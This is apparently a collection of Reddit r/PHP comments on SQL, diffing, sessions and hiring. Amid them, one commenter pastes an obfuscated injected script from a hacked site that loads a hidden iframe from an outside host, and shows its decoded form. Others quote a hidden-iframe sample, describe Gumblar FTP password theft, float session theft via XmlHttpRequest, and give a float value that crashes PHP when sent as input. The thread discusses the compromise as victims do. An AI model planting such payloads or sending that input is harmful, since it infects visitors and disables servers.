You don't need to "sanitize" anything -- plain text is not executable unless, though lack of care, someone makes it executable. A few ways to do that: pass it to SQL unescaped (becomes executable SQL), pass to the the browser unescaped (becomes executable JavaScript), or run it through eval() or equivalent stupidity. It's quite possible they screwed that up. However, if you've been hacked, are you sure it was through the application? I've had servers compromised and they managed to find an OS or server exploit to do it and then modified the app pages to send nefarious stuff out. A contact page isn't likely going to give too much opportunity to allow hackers to append code to pages. 
Rack is a webserver interface for Ruby. PHP effectively has the webserver interface built write in (and comes with adapters for various servers and, of course, it does CGI). 
You should rename it to Pie. Or Zen. Or Yee. 
Thanks a lot. This helps clear up a lot of the terminology. It's all starting to make sense. If I got it correctly, classes contain a group of related functions?
You might need this: https://github.com/indeyets/appserver-in-php
Seems like a lot of work. Common use case: I have a handful of checkboxes and want to select all rows matching any of the user-selected items. IN works great for this and I doubt anything else would perform better, all in all.
That is a bit extreme!, what about all the STDs
Just as a friendly note: your writing style might come off as a bit arrogant for some people. Of course, this easily can be some cultural or even mood incongruence. And thanks for the SlideShare link. As I haven't encountered problems* with storing trees this was quite new and interesting to me. \* most people die much sooner from the thousand cuts of small and redundant queries and complete lack of (result set) caching and/or precomputed lookup tables.
read a few hundred of these: http://stackoverflow.com/questions/tagged/php?sort=votes
Well damn... we might work at the same school... Banner is the beast with 3 heads. Thar be dragons where banner be. But seriously though, don't go one man super programmer on building a system that is going to do what banner does. Not unless the school you work for has less than a thousand students. The application is massive, the things you need to track are endless in count. We are talking a database with row counts growing exponentially. If you are really going to replace banner by yourself, hide behind a rock with 8 thousand packs of ramen, a pillow, and visual studio and don't come back for 12 months. I don't want to be discouraging but from my experience dealing with these people "upstairs", even if you build a perfect system, they will want more. Their appetite is insatiable. But to answer your question, grab sql developer and just run some reports on table structures. That should give you the information you need.
&gt;Except that limit isn't SQL, it's a vendor-specific extension. I assumed this would be ok since the question was specific to MySQL. I would think most other databases would have their own way of doing this, and although it's been a while for some of these, I believe MSSQL, Oracle, Postgre and SQLite all do. &gt;But yes, one needs to cope with gaps, and no, it isn't very hard. Can you explain this? I can't really think of a *good* way to cope with the gaps, although I haven't really put much thought into it before today since I usually take advantage of the vendor-specific extensions the database I'm using offers. I can think of a couple of ways off the top of my head: * Pulling all the ID's from the table and picking a random one: I can't imagine this is what you were talking about * Find the minimum ID and the maximum ID and then select a random number in between these and find the record with the ID &gt;= to the random number: This would probably work fine if you don't mind some records being more likely to come up than others.
We don't need that triflin ass bullshit around here
do you or do you not agree that someone with malicious intent could benefit from asking this question? Hence the joke.
Fuckin a. Just what I'm looking for. Well, enough information for me to google more. May the narwhals bless you and upvote you always.
I think perhaps your server was compromised -- it would explain the changes. The application may not be to blame at all. 
More detail would be good. * Your browser / platform * Their browser / platform * Your location relative to the server (network-wise) vs your client. These things probably *shouldn't* make the difference, but then again, the upload feature *should* be working so you can't count anything out as the cause.
cake
looking at this example, couldn't you use a XmlHttpRequest to push the data so that people don't notice you're stealing their sessions?
It still needs some serious development*, but a very promising step indeed. * Request handling tries to completely mimic PHP's behaviour, so handling large file uploads is problematic. * Worker management (handling of the listener socket) is a bit strange and looks inefficient. It'd be best if workers could just listen on separate ports, just like thin for RoR does, then one could just use ProxyPass directive with Apache or NGINX.
True. He probably has something like this: &lt;iframe src=”http://malicioussite.xxx” width=1 height=1 style=”visibility: hidden” /&gt; His account has been indeed compromised. This technique is known as a [gumblar attack](http://en.wikipedia.org/wiki/Gumblar), and it captures passwords from FileZilla (or any other FTP client) to later access the `index.php` files in the server, adding the above line.
Oh no I'm not replacing Banner myself I'm only replicating some of it. Just the course of record stuff and only to provide a slick web interface too it that isn't currently there. The data is one way Banner -&gt; web interface, the web side of the application will be by itself a tracking system for Course of record stuff. We're talking things like Chancelor ID, textbook revisions, date it was apped for Distance Learning that sort of thing. All in all we're looking at no more than 100 or so values that will be tracked. The load will be from banner should something change and any immediate changes made by the staff in charge of that system. So yeah it's a semi big project but no where near recreating Banner. I just unfortunately have to work with Banner to accomplish the goal.
don't know why people are down voting you. Down votes for calling people out for not knowing about example.com maybe? I'd hate to own poop.com, they must get a million signup spam emails from poop@poop.com (i.e. me)
Reminds me of the fate of the [Foo](http://bar.com/).
Eh? Just use PHP-FPM which is built into PHP. You can then use fastcgi_pass in NGinx.
I'm also using a simple wrapper function which provides a special syntax for that case. It auto-expands ?? into ?,?,?,?,? which is the same method used by Perls DBIx: db("SELECT * FROM foo WHERE bar IN (??)", $array); There's a few more edge cases where the simple PDO placeholders are insufficient. So writing a wrapper seemed sensible. http://sourceforge.net/p/php7framework/svn/60/tree/trunk/php7/db.php?force=True
Bingo.
[/r/forhire/](http://www.reddit.com/r/forhire/) would probably be the best place, with [Hiring] in the the title.
&gt; Just as a friendly note: your writing style might come off as a bit arrogant for some people. Did it occur to you that I might not actually be interested in public character judgements from strangers?
Hi, i managed to get it working with users filling out their skills with this. Thanks alot. But i got stuck on how to search. When an employer search he is to check boxes with skills according to his/hers needs, but, ehm, how would i query the database that?
"Oh, he gave a huge technical explanation of my position, and now I can see that I'm wrong. I better just call him a troll." You have no character.
&gt; Seems like a lot of work. If typing a dozen characters to get two orders of magnitude lower query complexity "seems like a lot of work," then SQL, and programming in general, aren't the jobs for you. But sure, hold up a trivial case where speed doesn't matter at all as an example of why doing it the bad way isn't bad. Not a red flag at all.
&gt; I assumed this would be ok since the question was specific to MySQL. Well, there are portable ways to achieve the same thing. &gt; I would think most other databases would have their own way of doing this Hilariously, Oracle has no such extension. That's sort of not the point, though: when there's a portable way to do something, one shouldn't do that something the non-portable way. This does make a hypocrite of me: my code examples frequently use auto_increment, when a trigger will do. I'm not criticizing you, exactly; I'm just holding you to a high standard. &gt; &gt; But yes, one needs to cope with gaps, and no, it isn't very hard. &gt; Can you explain this? What happened to people reading the manual :( This is really very easy if you think it through. I'm kind of tired of waking up and seeing a bunch of requests for hand-holding tutorials. Go read about the random sample functions. This is what they're for. I mean seriously, this is like asking someone how to do string parsing in PHP. There's a whole block of functions for this.
&gt; when there's a portable way to do something, one shouldn't do that something the non-portable way. I can agree with trying to keep things portable, but not taking advantage of extensions built into a platform when it is beneficial to use them doesn't seem very practical. If you are saying that the MySQL LIMIT extension doesn't offer any benefit, that is another argument. &gt; I'm just holding you to a high standard. I don't mind that at all &gt; What happened to people reading the manual I don't mind reading documentation one bit, and remember when "RTFM" wasn't considered impolite at all. I'm not sure which manual you are referring to here, though. &gt; I'm kind of tired of waking up and seeing a bunch of requests for hand-holding tutorials. Sorry I pushed one of your buttons, it really wasn't my intent. But I feel like if you think I'm asking you to give me a "hand-holding tutorial", then you are not really holding me to a high standard after all. Someone was asking for very basic PHP/MySQL advice, and you told them to: &gt; get the count of rows, pick a random number up to that, check to see if that's a valid row id, and if so, return that. Which I don't think is very helpful since it might seem to work at first, but doesn't actually work in a lot of circumstances. I really don't need you to walk me through and explain every step of whatever solution you were trying to recommend, but the one you actually recommended doesn't work and so I asked for clarification. Sadly enough, the actual [MySQL Documentation](http://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html#function_rand) has this to say: &gt; ORDER BY RAND() combined with LIMIT is useful for selecting a random sample from a set of rows Which is the exact thing you advised against (and I agree with you), but hopefully you can see why simply pointing me to "the documentation" without specifying anything else as to what you're talking about can sometimes be less than helpful. There are many, many different ways of selecting a random row in a table. Some are terrible, some are vendor-specific, some involve PHP, some are pure SQL... but unfortunately I am not able to tell which one you are advocating from just the incomplete (and broken) method you initially suggested. In any case, I am not really looking for a tutorial since the LIMIT functionality that MySQL provides is fine for my needs, I was just hoping to have a conversation with someone that I thought had an interesting method of solving this problem. Since you don't seem to want to talk, I am okay with assuming that it is one of the methods I already know about and call it a day. I hope the rest of your morning improves.
Just a hint: never say "great on your resume" and try to give some scope of the project.
Something like: SELECT u.user_id FROM user u, user_skill us WHERE u.user_id=us.user_id AND us.skill_id IN (1,2,3) GROUP BY u.user_id; Where "1,2,3" is the list of whatever skill ids are being searched for. In case you don't already, make sure you protect yourself against SQL Injection attacks. edit: I added a GROUP BY clause to avoid selecting the same user multiple times if they match multiple selected skills.
Yeah, it reminds me of this. http://www.reddit.com/tb/f113k Try to give some scope on the remuneration too!
&gt;Try to give some scope Scope on everything would be kind of nice. I realize s/he can't go too far into detail without giving away the ideas, but at least some architecture details would be nice (Standard LAMP/WAMP set up? Any XML? AJAX? etc). There's rarely any projects out there that are just "PHP" with nothing else involved, so it might be nice to get an idea.
diff and kdiff may help you start googling [edit] I forgot to add: http://en.wikipedia.org/wiki/Diff
* I'm on Linux and have used FF 3.6 and Chrome with no difficulties. * The client is on Mac OS X and using Chrome * We both use cable internet to connect to the server hosted at a third-party location (hostpapa.ca)
PEAR has a [Text_Diff package](http://pear.php.net/package/Text_Diff/redirected) that works well for this scenario. It can render the diff inline, using &lt;del&gt; and &lt;ins&gt; tags around changes. A little CSS and you have it. However, this kind of diffing only works well on **PLAIN TEXT**. If you plan to diff, say, HTML, you're in for a world of hurt if you need to keep your tags intact.
You could try this (if you have it installed): http://us3.php.net/manual/en/function.xdiff-string-diff.php
&gt; Sadly enough, the actual MySQL Documentation has this to say The MySQL manual is full of awful approaches to everything. Fuck's sake, they advise nested sets for trees. When one is saying "don't do dialect specific things," going to a dialect manual isn't really your best option. As far as the manual, there're no shortage of SQL books out there. There's the standard, there's Celko's SQL for Smarties (which addresses this topic,) there's Karwin's SQL Antipatterns (which addresses this topic,) there's SQL: the Complete Reference (which addresses this topic,) there's The SQL Bible (which addresses this topic,) etc.
Sorry I didn't respond to this earlier, but reddit was erroring when I tried to comment. I am not sure what frameworks do really, since I don't write large-scale apps in PHP, and I don't use frameworks very much. There are two different concepts here, though, one of which I have addressed. 1. Providing DB functionality to the appropriate classes. This can be done via inheritance (as I described above, dependency injection, or a singleton object. I think it depends on the scale of your project. People have strong opinions about this. Try to be pragmatic. 2. Where to locate the SQL query logic, whether it is auto-generated or manual. Some systems, like ActiveRecord, impose a consistent structure on the tables themselves so mapping those tables to classes is straightforward and can be done algorithmically. Again, depending on the scale of your project, writing a system like this can be overkill. Furthermore, having an artificial primary key can actually make some queries less efficient. There is no silver bullet solution. Since you are trying to learn, I suggest you keep an open mind and explore multiple solutions for various problems.
I do agree that "great on your resume" always sounds fishy. Sorry about that but I really mean it here. Guess there's no good way of saying it. Any suggestions? Both projects are aimed at getting money for charity I think it has a special appeal when it comes to resumes, but maybe that's just my opinion. I will edit the OP with some more info on the first project (TopThatDonation). Regarding the second one (Sharoo.org) I'll keep the idea with me and I will reveal it to the person who decides to collaborate on the first one (just because I don't really think it's time to make it public quite yet).
Cool graph, but I am going to pay for the work! :) Regarding remuneration I will talk to whomever is interested, I think it really depends on how well-versed the person is on the languages/technology used in the project.
yeah, I'm on the same track here. Zend is pretty great already, and I'm also intrigued by Yii, but I would rather start learning a new programming language than a new framework at this point. 
Thank you, I'll try! Yes, i protect myself, but thanks for the heads up!
Chapter 35.2 SQL for Smarties: "Random Rows from a Table" &gt; The answer is that, basically, you cannot directly pick a set of random rows from a table in SQL. There is no randomize operator in SQL. It goes on to talk about ways to implement pseudo-random numbers in pure SQL, but I'm not seeing anything that would be all that helpful in the relevant instance, and not anything that matches your initial proposed solution. --- Chapter 16 of SQL Antipatterns: "Random Selection" &gt; **ORDER BY RAND()** - Although this is a popular solution, it quickly shows its weakness. We already don't like this one. &gt; **Choose a Random Key Value Between 1 and MAX** - Use this solution when you know your key uses all values between 1 and the greatest key value. Your initial suggestion, but again it is flawed without additional logic to handle gaps in the keys &gt; **Choose Next Higher Key Value** - Use this solution when gaps are uncommon and when it’s not important for all key values to be chosen with equal frequency. I already mentioned this &gt; **Get a List of All Key Values, Choose One at Random** - Use this solution when you're selecting a random row from a simple query with a moderately sized result set. This solution is good for choosing from a list of noncontiguous values. Again, I already mentioned this previously and didn't think it was what you were suggesting &gt; **Choose a Random Row Using an Offset** - This solution relies on the nonstandard LIMIT clause, supported by MySQL, PostgreSQL, and SQLite. An alternative that uses the ROW_NUMBER() window function works in Oracle, Microsoft SQL Server, and IBM DB2. This is the solution you dislike because it isn't portable &gt; **Proprietary Solutions** I'm guessing you dislike this at least as much as LIMIT Unless I missed one of the methods explained in this book, I'm not seeing anything we haven't already brought up. And I still think, based on this book, I would use LIMIT (or whatever was applicable to the DB I was working with) --- I really don't think it's necessary to go through all of your provided references and do this. Continually pointing out that there is a better way to do something and then citing references that don't provide a different/better way to do it does not actually contribute anything to this conversation. If you do actually have a portable, "very easy" way to pick a random row from a table that we haven't already talked about, I would love to hear it. I don't mean that in an "I know you don't have one" way, I would genuinely enjoy it if you did have a solution that I'm not thinking of. At this point you have suggested 4 books for me to read, 2 of which don't seem to have anything new to add to our discussion, and this is all to try and get me to understand something that is supposed to be "very easy" that you don't seem to want to just name specifically (or cite a specific page, or link to some technical paper, or anything). I'm getting the impression at this point that you aren't trying to patch the holes in your initial flawed solution any longer and that you are currently teaching me things I don't already know, and so we should just end the conversation here since it's not particularly helpful to either of us. I'm sure we both have actual work to do today!
Well, this "trivial case" describes about 90% of the time I've seen IN used.
I'd be careful how you encode/decode the text. In Javascript using escape() &gt; This function encodes special characters, with the exception of: * @ - _ + . / In PHP using urldecode() &gt; Plus symbols ('+') are decoded to a space character. So for instance, if you have a "+" in your text, it will be left alone by escape(), and then turned into a space by urldecode(). I can't say anything specific to PHP Tidy or if you actually need to be encoding/decoding this stuff you are posting, but you might want to use encodeURIComponent() in Javascript, and rawurldecode() in PHP.
Maybe you missed the part where I already said what it was, in your rush to read the wrong parts of the book. It's called a table sample. (sigh) Picking a random sample from the table isn't the same thing as getting a bunch of random rows. You can't draw geometry with a compass, but you *can* draw circles. Yes, the guy asked how to get random rows, but he actually wants a table sample. So do you. When you read the rest of those books, you'll understand why I'm saying this can be done, and calling it something different. TABLE SAMPLE.
Just leave the phrase out. It either wont actually look good on a resume, and you'll sound like a con, or it will, in which case anyone smart enough to do it is smart enough to realize it will look good.
&gt; Go read about the random sample functions. This is what they're for. I did see you mention it, and searching these books for "random sample" like you mentioned previously pulled up the chapters I referenced. I'm not finding anything for "table sample" in the indexes, and, and it's not particularly helpful to search for since a lot of the tables in their examples are named "sample" and that is all I can find in the search results. Can you point me to where in one of these books you are referring to? It would save us a lot of time. edit: I loaded the read and responded before you added everything past the "(sigh)". &gt; Yes, the guy asked how to get random rows, but he actually wants a table sample. So do you. Wasn't your original response answering how to get random rows? I thought that was what we were discussing. &gt; When you read the rest of those books, you'll understand why I'm saying this can be done, and calling it something different. I don't actually think this is true, but even if it is I'm not sure how having to read 4 entire books on SQL constitutes something "not very hard", and "really very easy if you think it through". Your original suggestion to the OP was not helpful (or at least not in it's original form), you refuse to explain it any further, and now keep shouting TABLE SAMPLE and telling me I'm reading the wrong chapters in your books when the exact solution you have is in one of the chapters I quoted. I'm not even trying to argue with you about the difference between table samples and random row selection. The OP asked for a way to select a random row from a table, and the solutions I've provided do just that.
DONE: http://www.reddit.com/r/forhire/comments/fa407/hiring_programmer_lamp_ajax_and_xhtmlcss/
Hmm, I once implemented a (rather abstract) implementation of the diff algorithm in PHP. Feed it two arrays of *things* and it will return information on what was added, removed or what remained the same. Should work for words, lines or anything else (given anything can be naturally compared in PHP or a comparator closure is provided). You can use it like this $someDiff = \mg\Diff :: diff(array('this', 'is', 'a', 'test'), array('this', 'is', 'only', 'a', 'test')); If you like you can check it out, [the source is freely available](http://code.google.com/p/mgframework/source/browse/trunk/mangrove/framework/util/Diff.php).
This isn't actually true. If you store the parent id (ie article id) on every comment you can just do a select based on that article id and then post process the query result set in PHP.
I would not recommend recursion. You would kill your server on large trees on a busy site.
dunno why you are being down-voted. it really is that simple (essentially)
Normally something that says something akin to 'we are a small company/nonprofit/startup" gives an idea of the pay. Just say that pay is negotiable (unless you really are just battering services or looking for an unpaid internship, then just state that). Being polite and upfront without trying to sugar coat anything will get you a lot further than you may think.
Yep. Session_start is called first. I never got this to work as desired so I resorted to using a cookie for this. Thankfully it's not sensitive data :-)
I am not trying to sugar coat anything. I guess I am just bad at creating job ads. Of course an unpaid internship would be awesome but I wouldn't feel comfortable having someone work for free. I will edit the post at /r/forhire to reflect your suggestions. Thank you! :)
I reread my initial post and it IS a little imprecise. I'll be sure to word things better in the future. ;-)
This is what it put on the bottom of two pages &lt;script&gt;eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%73%69% 65%6E%68%75%2E%63%6F%6D%2F%3F%31%38%36%35%36%31%34%30%22%20%77%69% 64%74%68%3D%31%20%68%65%69%67%68%74%3D%31%3E%3C%2F%69%66%72%61%6D %65%3E%27%29'));&lt;/script&gt;&lt;!-- uy7gdr5332rkmn --&gt; It evaluates to &lt;iframe width="1" height="1" src="http://sienhu.com/?18656140"&gt;&lt;/iframe&gt; If someone actually had access, I don't know why they wouldn't just put it in the body tag and why they would choose only those two scripts.
&gt; Picking a random sample from the table isn't the same thing as getting a bunch of random rows. Maybe in some cases, but not in the case the OP is working with &gt; You can't draw geometry with a compass, but you can draw circles. Not sure what point this is supposed to prove... and a circle isn't geometry? &gt; Yes, the guy asked how to get random rows, but he actually wants a table sample. So do you. Actually, he wants a random row. And I didn't post any question for you to solve, so I'm not sure why you think I want to use a table sample. --- Sorry this is split into two replies, I blame Reddit. And laziness.
Been trying to respond to this for like 8 hours now, keep getting 504 errors. I'm not trying to recreate banner I'm trying to create an interface for a relatively small amount of data that is in banner because the interface is too complex for your average user and they want to track some additional data that's not currently handled by Banner. So it's going to pull some data on a set schedule from Banner on course of record stuff like chancellor id, textbook updates, date's applied for distance learning that sort of thing. And then some additional crap that isn't in there yet that will be entered into my system by some users. It will then be able to create reports that are up to date with whats in Banner, including the additional data which can be generated by the instructors or department heads when needed over the internet without needing to get someone like myself to go in to Banner and generate that report. 
Yeah I do want something *like* it but I don't have the time to adopt a framework at the moment. I'd like something a little more specific and 'drop in'. I'm baffled that no such application yet exists.
Yeah because a link to a 404 page that no one has any reason to click might cost them ones or even tens of cents.
You might want to read this, it's directly related to that code snippit you posted: http://blog.unmaskparasites.com/2010/09/29/geezter-qawfer-and-other-malicious-iframes-from-121-156-57-184/ Putting stuff at the bottom of the file is just expedient (and effective) -- you're assuming a high-level of sophistication for these script kiddies. 
&gt; I'm not finding anything for "table sample" in the indexes Select frustration, googleInadequacy, boredom, knowingSqlBasics from reasonsToStopThisConversation TableSample(10); &gt; &gt; Yes, the guy asked how to get random rows, but he actually wants a table sample. So do you. &gt; Wasn't your original response answering how to get random rows? Why do people ignore my metaphors? They're there for a reason. If someone asked me how to make geometry with a compass, I wouldn't tell them "you can't, but here's how to make a circle, which is one specific case of geometry." I'd just put the compass sharp tip down, drag the pencil tip around, and say "like this." What I showed him was a circle. I just called it geometry, because it's one narrow case of geometry. Then you looked up compasses in a geometry book, which says "you can't use a compass to draw geometry," which is true. Then I said "look, you can't use compasses to draw geometry, but this guy only wants circles, like you do." So you pointed to my circle and asked me if it was geometry. How do I answer that without giving you the wrong idea? &gt; &gt; When you read the rest of those books, you'll understand why I'm saying this can be done, and calling it something different. &gt; I don't actually think this is true I have more faith in you than you do. I choose to interpret this as you saying you won't get it on reading, instead of questionning the metaphor you apparently didn't even take the time to try to understand. &gt; I'm not sure how having to read 4 entire books on SQL constitutes something "not very hard", and "really very easy if you think it through". I didn't say that. Similarly it's not very hard to see how you can use a compass to draw a circle, but if you don't already know how, and you've annoyed the guy who doesn't want to answer you anymore, he might tell you to read one of those books to figure it out. Something isn't not not-very-hard just because you refuse to try. &gt; Your original suggestion to the OP was not helpful OP disagrees. &gt; you refuse to explain it any further OP hasn't asked me to. I don't want to explain *to* *you* because you're being obnoxious, ignoring the things that are already said to you, and insisting that just because you don't know how to do something, someone else is wrong about it. &gt; and now keep shouting TABLE SAMPLE Right, reddit has volume, and you're not melodramatizing for effect at all. It never ceases to amaze me how people who are told they're not getting an explanation because I find their attitude unpleasant so frequently respond by turning up the volume on the attitude. Highly Effective Stuff. &gt; I'm not even trying to argue with you about the difference between table samples and random row selection. Yes, you are. &gt; &gt; When you read the rest of those books, you'll understand why I'm saying this can be done, and calling it something different. &gt; I don't actually think this is true Mmm hmm. &gt; The OP asked for a way to select a random row from a table, and the solutions I've provided do just that. Yes. Badly. And I explained why. And if you don't get it, well, okay then. Have a nice day. I might have explained if you hadn't been so whiny and critical. Flies with honey, and all that jazz.
&gt; &gt; Picking a random sample from the table isn't the same thing as getting a bunch of random rows. &gt; Maybe in some cases, but not in the case the OP is working with For someone who doesn't understand the difference, and claims not to be arguing the difference, you sure seem ready to argue it in every single post. &gt; &gt; You can't draw geometry with a compass, but you can draw circles. &gt; Not sure what point this is supposed to prove. Obviously. &gt; &gt; Yes, the guy asked how to get random rows, but he actually wants a table sample. So do you. &gt; Actually, he wants a random row. "This guy doesn't want geometry, he just wants circles." "Actually, he wants just one geometric object." Way to miss the point, chachi. &gt; Not sure what point this is supposed to prove... and a circle isn't geometry? Yes, that was the point. Don't worry, you'll get it sooner or later. Carry on with selecting the entire database, then shuffling the entire database, then returning a single row. &gt; And I didn't post any question for you to solve Um. &gt; Can you point me to where in one of these books you are referring to? &gt; Wasn't your original response answering how to get random rows? &gt; you refuse to explain it any further &gt; and a circle isn't geometry? &gt; I assumed this would be ok ... Can you explain this? So yeah, I guess that's you not posing any questions for me. Maybe in your mind, it's the word "solve" that isn't represented here. Good luck to you, Mr. Ryerson. This many replies without so much as a thank-you is your cut-off.
&gt; Carry on with selecting the entire database, then shuffling the entire database, then returning a single row. I'm not sure why you think that is the solution I was advocating. This entire thread started because you didn't like my use of a MySQL-specific extension in an answer to a question about how to do something in MySQL. And that answer did not do any of what you mention above, other than returning a single row. Then you shifted the conversation to where it is right now. &gt; &gt; Can you point me to where in one of these books you are referring to? &gt; &gt; Wasn't your original response answering how to get random rows? &gt; &gt; you refuse to explain it any further &gt; &gt; and a circle isn't geometry? &gt; &gt; I assumed this would be ok ... Can you explain this? &gt; So yeah, I guess that's you not posing any questions for me. You have got to be kidding me... can you take any of that more out of context? Oh sorry, didn't mean to ask you another question I need "solved". Seriously, those were all questions clarifying things you said in our conversation that had to do with your wording or something that was unclear. Not something I was expecting you to explain to me about a solution to a SQL problem. I haven't once in this entire thread asked you to teach me how to solve an SQL problem, I asked you to clarify a solution you provided to a problem I didn't have. And it's not that your metaphor wasn't understood, it's that it was unnecessary and I was questioning you bringing it up in the first place. &gt; &gt;Your original suggestion to the OP was not helpful &gt; OP disagrees. I don't see where this happened. But I wasn't actually saying whether or not OP found it helpful. The fact is that it was NOT helpful. This: &gt; get the count of rows, pick a random number up to that, check to see if that's a valid row id, and if so, return that. is terrible advice. &gt; you've annoyed the guy who doesn't want to answer you anymore &gt; you're being obnoxious &gt; if you hadn't been so whiny and critical You're right, we went far too long without throwing insults at each other. &gt; This many replies without so much as a thank-you is your cut-off Just. Wow. If someone is asking you questions about your position it might be because you are not providing enough info for your position to be understood, and not because the person wouldn't understand it if you spoke to them intelligently. I do agree with you on one thing though, I don't think there is anything else to gain from continuing this conversation. You seem riled up right now, so I'll just say goodbye, and that I hope to bump into you again in another thread under different circumstances so we can have a real discussion. I think if you start from the mindset that I would understand what you are saying we could have a much more meaningful talk. Not that that's what you're looking for. Until then, take care.
&gt; Oh sorry, didn't mean to ask you another question I need "solved" Go downvote someone else for answering your questions, sir. 
Although it probably makes you happy thinking of me angrily mashing the downvote arrows, I can assure you that I have actually upvoted every comment in this thread. Not sure if you noticed that all of your comments throughout the morning were +2|-0 when we were most likely the only people reading them. I think you incorrectly believe I'm mad or upset about our conversation, but I'm actually just disappointed at the way it ended up. No reason for me to downvote anything though.
&gt; I think you incorrectly believe I'm mad or upset about our conversation I do. The reason why is phrases like these: &gt; You have got to be kidding me... can you take any of that more out of context? &gt; You're right, we went far too long without throwing insults at each other. &gt; Just. Wow. And no, it doesn't make me happy to think that the second I reply to a guy to help him, first he says stuff like that to me, then my posts drop to zero. I was just following the most likely explanation. But if that's not how it's worked, then so much the better.
Here is the code. Sorry it took me so long to get this up. It's been real hectic at work :( Code in 'ajax page' ( receiving page that will do the session variable update ) session_start(); $_SESSION[$_REQUEST['settingElementName']] = $_REQUEST['settingElementValue']; Code in the page that calls the 'ajax page': txtURL = "_ajax_handlers/set_session.php?settingElementName=" + settingElementName + "&amp;settingElementValue='true'"; oReq.open("GET", txtURL, true); oReq.send(null); Notes: * The two pages are in the same domain * The page that has the 2nd line of code above ( the page doing the call to ajax ) is https. * Instead of a relative URL, I tried using a hard-coded fullly qualified url using 'https' but the results were the same. * I put in debugging code that shows the result of the 'ajax page' and it is totally different than the results of the calling page. I did print_r($_SESSION) on both pages.
Assign 2.2250738585072011e-308 to any GET or POST fields, preferably numeric ones that might be cast to float.
That's not server side code.
You seem to be doing about the same as [Ruckusing](http://code.google.com/p/ruckusing/) which I've used with great success. So I must say I think your idea isn't bad.
Arrrgh. All the elegance of Javascript's everything's-an-object approach, smashed with the absurd number of globally definied PHP functions.
I hadn't seen that one, thanks for letting me know about it. Right now mine just uses straight SQL as the migrations, but I might add some "DSL" (note: not a real DSL) to simplify things a bit. Thanks!
It appended it to the php files themselves after the closing &lt;/html&gt; tag.
Thats a great resource, do you got anymore like these that you recomend?
Just about anything Bill Karwin or Joe Celko writes is worth your time.
Programming, just press keys on your keyboard. Not complicated.
Cake has changed over the past few years. I wouldn't dare use the 1.2 framework (though quite a few large sites have), but the 1.3 framework is stable, quick, and smooth enough for me and I've begun using it.
I think some people prefer complicated solutions.
Personally I've used both migrations and DataMapper style model synchronisation and I vastly prefer the latter. It means you can check out any version/branch of your app and the database will match the model definition. But if you do prefer using migrations, then you're on the right lines here.
I really see no problem with it, so you are telling me you write queries like: SELECT * FROM foo WHERE bar = 1 OR bar = 2 OR bar = 3 OR bar = 4 in your application instead of: SELECT * FROM foo WHERE bar IN (1,2,3,4)
Interesting wrapper. PDO sometimes seems limiting, so it's nice to libraries that make it easier.
Hey thanks for the heads up - much appreciated.
No, where did you get that idea?
Ahh, that's a good thing to think about, you'd have to do a pretty good job to make sure your models match up with your migrations. Since I developed this primarily for work and we don't use explicit models, it works better with that environment. I do have an ORMish DataMapper framework called datamodeler (https://github.com/leftnode/datamodeler) that I might try integrating with this. Thanks for the insight.
Ah! You are creating a reporting front end for banner because its interface is shit. That makes a hell of a lot of sense actually. I am interested in where this goes. What school do you work for? 
Damn. That's odd. I suggested the same thing yet got downvoted to oblivion. I dare say there's a certain someone using a bunch of sock-puppets to annoy folks on this and other subreddits. It's getting pretty annoying.
Taft College, small community college in Taft California.
22 hours, no response. 
yea, it sounds like you have the right idea. The tough part is keeping it all organized in a way that makes sense, which is why we have design patterns like MVC. When you say MVC, people know exactly what you're talking about. When I say Singleton, people know I'm talking about an object that cannot be constructed multiple times. A good example of a singleton is $_SESSION in php. You'll never have more than 1 instance of the session. Another example of a singleton is a Factory class that just calls constructors eg Factory::createUser() is a static method that just does `return new User();` . You're on your way to being a serious programmer :)
&gt;You're on your way to being a serious programmer Thanks! I have a ways to go though. You guys are a lot of help. &gt;The tough part is keeping it all organized in a way that makes sense Organizing is one of the toughest parts for me. I'm pretty bad at planning ahead. Gotta work on that...
Usually, each database table has its own object (model), with its own controllers. If you think about it, there are only 4 core commands on the database: insert, update, select, and delete.. Most MVC frameworks follow this pattern known as CRUD (create, retrieve, update, delete). A lot of MVC projects start out with 'scaffolding', which is just a database with 4 actions (controller) on each table. It gets everything up and working quickly.
If you're looking for a solution to use in your own project, you could consider using an ORM like Doctrine or Propel. Both have what are called behaviors, and 'nested' is one of them. The api is almost too easy to work with.
Oh, nice. I like that. Seems like it keeps code consistent. The concepts of MVC and a framework are starting to come together. I still think that I should try learning OO before getting into a framework though, right?
Part of me wants to post your schema, but the wiser part says you need to do more reading and learn more first. There are 1,000's of open source web apps with schemas you can examine. There are books at Safari, Barnes &amp; Noble, Borders, etc.. MySQL Cookbook comes to mind. I have had to attend college, purchase books, rummage through tons of source code, google, grep, man, experience failure, pressure and have been humbled to learn from those I thought inferior. That was all valuable experience every programmer should have. Plus, StoneCypher will just crap on anything anyone else posts anyway. Some clues: I'd suggest InnoDB for anything you don't need full text indexes for, MyISAM on anything you do. Your file_id is unique enough for files, you can use customer_id together with your file id to cache them on the drive, then you can 'name' the files whatever you want and you don't have to worry about name collision. I use this sometimes to preserve the original file names. /cache/c/&lt;id&gt;/files/&lt;id&gt; Something like that. Anyway, good luck. 
OMG NO! Not extract()! It's an abomination.
Without getting too deep, one quick suggestion: learn &amp; use a decent framework (Kohana, Yii, CodeIgniter, Symfony, etc) with decent data abstraction (most of them do). They'll handle the database &amp; security concerns for you, it's what they're there for. 
Thank you. I actually just asked about frameworks recently in another post. I don't know OO at all I'm a PHP novice at best, so it seems like diving into a framework is going to be a little over my head.
What about when something breaks and he has no idea how it all works so can never fix it?
Thanks. I was hesitant to post because I don't realize how much I'm asking of you guys. I don't realize the amount of work that goes into DB planning. Maybe I need to read more about it. I took DB design in a class years ago, so I only really know basics. Maybe I need to pick up a book. I appreciate the help - thanks!
First question is what exactly is your website about and what features do you want it to have? That will tell us in greater detail what you want to do. The database you described looks incredibly generic and could be almost anything. It's very unclear as to what you are trying to do. Second, you seem to lack basic knowledge. Are you a student? I only say this because you are missing so much it would be impossible to cover in one little comment. SQL has an AUTO_INCREMENT function that increases the ID by 1 automatically. You can use this for IDs and for renaming pictures so that the name remains unique. Second you don't seem to have anything in there for user management (i.e. cookies, sessions, passwords etc). That's a whole other beast, you should google for tutorials on how to do a login system. Does the page for the job_id verify that the user has permission to view it? Tell me what you want your site to be able to do. Forget about the database for now, describe it like you would to a layperson.
